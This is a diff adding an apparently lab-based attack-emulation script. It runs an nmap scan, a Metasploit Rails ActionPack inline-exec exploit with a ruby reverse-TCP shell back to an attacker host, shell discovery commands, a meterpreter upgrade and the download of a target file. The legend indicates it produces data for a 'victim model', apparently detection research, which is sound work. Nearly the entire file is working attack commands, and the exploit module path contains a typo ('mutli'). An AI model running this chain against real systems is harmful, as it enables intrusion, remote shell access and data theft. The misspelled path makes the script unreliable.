@@ -1,0 +1,43 @@
+#Attack Scenario 3
+
+#----LEGEND----#
+##next command(s) are statemachine commands
+##-m next command(s) are msfconsole internal command
+#@next command is a setup commands that will not affect the attack
+#$output of previous command is a data source for victim model 
+#*output of previous command has a variable for attack management
+#?FYI
+
+#?Overview
+#?RECON - nmap Fin Scan
+#?INITIAL INTRUSION - Ruby on Rails
+#?DISCOVERY (Target File) - 10_of_spades.png
+#?DATA EXFIL - meterpreter download
+
+#----Just attack commands----#
+#The minimal commands to run end to end attack
+#No descriptions or data sources
+#victim = 10.0.2.9
+#attacker = 10.0.2.8
+##RECON
+nmap -sV -Pn -T5 -sF 10.0.2.9
+#@Part of multiple state
+msfconsole
+##-m INITIAL INTRUSION
+use exploit/mutli/http/rails_actionpack_inline_exec
+set payload ruby/shell_reverse_tcp
+set rhost 10.0.2.9
+set rport 3500
+set targetparam os
+set targeturi /readme
+exploit -j
+#*"Command Shell session X opened ..."
+##-m DISCOVERY
+sessions -i X -c 'whoami'
+sessions -i X -c 'find . -name 10_of_spades.png'
+#*location of 10_of_spades.png
+##-m DATA EXFIL
+sessions -u X
+#*"Meterpreter session Y opened ..."
+##-m DATA EXFIL (*capital C)
+sessions -i Y -C 'download public/images/10_of_spades.png'
